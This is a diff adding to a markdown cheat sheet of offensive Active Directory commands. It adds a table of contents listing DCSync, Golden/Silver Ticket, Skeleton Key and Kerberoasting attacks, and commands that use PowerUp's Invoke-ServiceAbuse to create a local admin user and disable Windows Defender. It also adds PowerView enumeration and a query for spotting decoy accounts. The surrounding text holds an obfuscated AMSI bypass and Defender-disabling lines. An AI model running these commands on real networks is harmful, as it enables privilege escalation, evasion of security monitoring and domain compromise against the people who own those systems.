@@ -8,6 +8,23 @@
   - [Domain Enumeration](#domain-enumeration)
 - [Commands](#commands)
   - [Bypass PowerShell Logging](#bypass-logging)
+  - [Local Privilege Escalation](#local-privilege-escalation)
+  - [Domain-Enumeration](#domain-enumeration-commands)
+  - [BloodHound](#bloodHound)
+  - [Lateral Movement](#bloodHound)
+  - [Domain Persistence](#bloodHound)
+    - [DCsync Attack]
+    - [Diamond Ticket]
+    - [Golden Ticket]
+    - [Silver Ticket]
+    - [Skeleton Key]
+    - [Custom SSP]
+  - [Domain Privilege Escalation](#bloodHound)
+    - [Kerberoasting]
+    - [Constrained Delegation]
+    - [Unconstrained Delegation]
+  - [Enterprise Admin Escalation and Forest Trust Abuse](#bloodHound)
+  - [Lateral Movement](#bloodHound)
 - [Living off the land](#living-off-the-land)
   - [Active Directory Built in Commands](#ad-enumeration)
 
@@ -39,6 +56,9 @@
 ### Bypass Execution Policy
 `powershell -ep bypass`
 
+### Bypass Enhanced Logging
+`RunWithRegistryNonAdmin.bat`
+
 ### Bypass AMSI 
 https://amsi.fail/
 ```
@@ -50,6 +70,31 @@ sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) 
 Set-MpPreference -DisableRealtimeMonitoring $true
 Set-MpPreference -DisableIOAVProtection $true
 ```
+
+## Local Privilege Escalation
+```
+. .\PowerUp.sp1
+Invoke-AllChecks
+```
+
+### Create local admin user.
+`Invoke-ServiceAbuse -Name 'ServiceName' -User domain\username -Password Password123`
+
+### Run a custom command (Disable Defender)
+`Invoke-ServiceAbuse -Name 'ServiceName' -Command "Set-MpPreference -DisableRealtimeMonitoring $true"`
+
+## Domain Enumeration Commands 
+### Powerview
+`. .\PowerView.ps1`
+
+### Get Domain Controller Information
+` Get-NetDomainController`
+` Get-NetDomainController -Domain domain.local`
+
+### Get User Information
+#### Check for decoy accounts (logon or bad password is 0).
+`Get-UserProperty -Properties pwdlastset,logoncount,badpwdcount`
+
 
 --- 
 ## Living off the Land
